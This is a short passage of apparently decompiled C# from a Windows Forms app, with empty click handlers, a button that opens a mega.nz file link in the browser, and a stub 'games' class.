		private void label6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000115 RID: 277 RVA: 0x0000F12E File Offset: 0x0000D32E
		private void userid_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000116 RID: 278 RVA: 0x0000F131 File Offset: 0x0000D331
		private void siticoneRoundedButton8_Click_1(object sender, EventArgs e)
		{
			Process.Start("https://mega.nz/file/1EUyFQYI#-e7YRmAnltl__9A2ib0EsJ-ON_ksrs3RubsW6ZsPcM8");
		}

		// Token: 0x04000087 RID: 135
		private string grwXIswrPv;

		// Token: 0x04000088 RID: 136
		internal static object random;

		// Token: 0x02000023 RID: 35
		private class games
		{
			// Token: 0x06000149 RID: 329 RVA: 0x000152C2 File Offset: 0x000134C2
			internal void Show()
			{
				throw new NotImplementedException();
			}
		}
	}
}
